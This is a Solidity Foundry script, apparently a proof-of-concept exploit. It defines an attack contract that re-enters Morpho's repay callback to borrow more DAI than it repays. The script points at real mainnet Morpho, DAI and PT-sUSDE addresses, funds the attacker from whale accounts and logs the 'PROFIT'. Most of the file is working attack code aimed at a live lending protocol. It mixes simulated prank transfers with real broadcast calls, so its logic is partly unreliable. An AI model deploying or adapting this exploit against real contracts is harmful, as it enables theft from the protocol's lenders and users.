// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// Minimal interfaces needed for the script
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IMorphoRepayCallback {
    function onMorphoRepay(uint256 assets, bytes calldata data) external;
}

// Simplified interfaces
interface IMorpho {
    function idToMarketParams(bytes32 id) external view returns (MarketParams memory);
    function supplyCollateral(MarketParams calldata marketParams, uint256 assets, address onBehalf, bytes calldata data) external;
    function borrow(MarketParams calldata marketParams, uint256 assets, uint256 shares, address onBehalf, address receiver) external returns (uint256, uint256);
    function repay(MarketParams calldata marketParams, uint256 assets, uint256 shares, address onBehalf, bytes calldata data) external returns (uint256, uint256);
    function withdrawCollateral(MarketParams calldata marketParams, uint256 assets, address onBehalf, address receiver) external;
    function position(bytes32 id, address user) external view returns (uint256 supplyShares, uint128 borrowShares, uint128 collateral);
}

struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}

// Attack contract demonstrating the reentrancy
contract MorphoAttack is IMorphoRepayCallback {
    IMorpho public immutable morpho;
    address public immutable loanToken;
    address public immutable collateralToken;
    bytes32 public immutable marketId;
    bool public attacking = false;

    constructor(address _morpho, address _loanToken, address _collateralToken, bytes32 _marketId) {
        morpho = IMorpho(_morpho);
        loanToken = _loanToken;
        collateralToken = _collateralToken;
        marketId = _marketId;
    }

    // Execute the attack
    function executeAttack(uint256 repayAmount) external {
        uint256 balanceBefore = IERC20(loanToken).balanceOf(address(this));
        console.log("Balance before attack:", balanceBefore / 1e18, "DAI");

        // Approve tokens for repayment
        IERC20(loanToken).approve(address(morpho), repayAmount);

        // Set attacking flag
        attacking = true;

        // Get market parameters
        MarketParams memory params = morpho.idToMarketParams(marketId);

        // Execute attack through repay function with callback
        morpho.repay(params, repayAmount, 0, address(this), "ATTACK");

        attacking = false;

        uint256 balanceAfter = IERC20(loanToken).balanceOf(address(this));
        console.log("Balance after attack:", balanceAfter / 1e18, "DAI");
        console.log("PROFIT:", (balanceAfter - balanceBefore) / 1e18, "DAI");
    }

    // Callback function where reentrancy happens
    function onMorphoRepay(uint256 assets, bytes calldata) external override {
        console.log("Inside callback, repaying:", assets / 1e18, "DAI");

        if (!attacking || msg.sender != address(morpho)) return;

        // Get market parameters
        MarketParams memory params = morpho.idToMarketParams(marketId);

        // Calculate a safe borrowing amount - at this point we already have 0 borrow shares
        // So we can borrow based on our full collateral value
        (,, uint128 collateral) = morpho.position(marketId, address(this));
        console.log("Collateral position during callback:", uint256(collateral) / 1e18);

        // Borrow more than we're repaying - this is where the profit comes from
        uint256 newBorrowAmount = assets * 12 / 10; // 120% of what we're repaying
        console.log("Borrowing in callback:", newBorrowAmount / 1e18, "DAI");

        morpho.borrow(params, newBorrowAmount, 0, address(this), address(this));

        console.log("DAI balance during callback:", IERC20(loanToken).balanceOf(address(this)) / 1e18);
    }

    // Setup our initial position
    function setupPosition(uint256 collateralAmount, uint256 borrowAmount) external {
        // Get market parameters
        MarketParams memory params = morpho.idToMarketParams(marketId);

        // Approve collateral
        IERC20(collateralToken).approve(address(morpho), collateralAmount);

        // Supply collateral
        morpho.supplyCollateral(params, collateralAmount, address(this), "");

        console.log("Supplied collateral:", collateralAmount / 1e18);

        // Borrow some tokens
        morpho.borrow(params, borrowAmount, 0, address(this), address(this));

        console.log("Borrowed amount:", borrowAmount / 1e18);
        console.log("Initial DAI balance:", IERC20(loanToken).balanceOf(address(this)) / 1e18);

        // Check our position
        (,uint128 borrowShares, uint128 collateral) = morpho.position(marketId, address(this));
        console.log("Collateral position:", uint256(collateral) / 1e18);
        console.log("Borrow shares:", uint256(borrowShares));
    }
}

// Full end-to-end script
contract MorphoReentrancyTest is Script {
    // Mainnet addresses
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant COLLATERAL_TOKEN = 0xE00bd3Df25fb187d6ABBB620b3dfd19839947b81; // PT-sUSDE-27MAR2025
    address constant LOAN_TOKEN = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
    bytes32 constant MARKET_ID = 0x5e3e6b1e01c5708055548d82d01db741e37d03b948a7ef9f3d4b962648bcbfa7;

    // Large holders of these tokens (with correct checksums)
    address constant PT_WHALE = 0x63F4cbBd88033C366507c3F6Edf0AD64C32cb641; // PT holder
    address constant DAI_WHALE = 0xD1668fB5F690C59Ab4B0CAbAd0f8C1617895052B; // DAI holder

    function run() external {
        // Check PT token whale
        vm.startPrank(PT_WHALE);
        uint256 ptBalance = IERC20(COLLATERAL_TOKEN).balanceOf(PT_WHALE);
        console.log("PT Whale balance:", ptBalance / 1e18, "PT-sUSDE");

        // We'll use a smaller amount to ensure it works
        uint256 collateralAmount = 1_000 * 1e18; // 1,000 PT tokens
        require(ptBalance >= collateralAmount, "Not enough PT tokens");
        vm.stopPrank();

        // Check DAI whale
        vm.startPrank(DAI_WHALE);
        uint256 daiBalance = IERC20(LOAN_TOKEN).balanceOf(DAI_WHALE);
        console.log("DAI Whale balance:", daiBalance / 1e18, "DAI");

        // We'll use a smaller amount for initial liquidity
        uint256 initialDai = 500 * 1e18; // 500 DAI
        require(daiBalance >= initialDai, "Not enough DAI");
        vm.stopPrank();

        // Now execute the full attack
        console.log("\n--- DEPLOYING ATTACK CONTRACT ---");

        // Start broadcasting real transactions
        vm.startBroadcast();

        // Deploy the attack contract
        MorphoAttack attacker = new MorphoAttack(
            MORPHO,
            LOAN_TOKEN,
            COLLATERAL_TOKEN,
            MARKET_ID
        );

        console.log("Attack contract deployed at:", address(attacker));

        // Stop broadcasting for non-transaction operations
        vm.stopBroadcast();

        // Transfer tokens to the attacker contract
        console.log("\n--- TRANSFERRING TOKENS ---");

        // Transfer PT tokens from whale
        vm.startPrank(PT_WHALE);
        IERC20(COLLATERAL_TOKEN).transfer(address(attacker), collateralAmount);
        console.log("Transferred", collateralAmount / 1e18, "PT-sUSDE to attacker");
        vm.stopPrank();

        // Transfer DAI from whale
        vm.startPrank(DAI_WHALE);
        IERC20(LOAN_TOKEN).transfer(address(attacker), initialDai);
        console.log("Transferred", initialDai / 1e18, "DAI to attacker");
        vm.stopPrank();

        // Resume broadcasting
        vm.startBroadcast();

        // Setup the position - collateral and borrowing
        console.log("\n--- SETTING UP POSITION ---");
        uint256 borrowAmount = 700 * 1e18; // Borrow 700 DAI (70% of collateral)
        attacker.setupPosition(collateralAmount, borrowAmount);

        // Now execute the attack
        console.log("\n--- EXECUTING REENTRANCY ATTACK ---");
        uint256 repayAmount = 400 * 1e18; // Repay 400 DAI
        attacker.executeAttack(repayAmount);

        // Stop broadcasting
        vm.stopBroadcast();

        console.log("\n--- ATTACK COMPLETE ---");
    }
}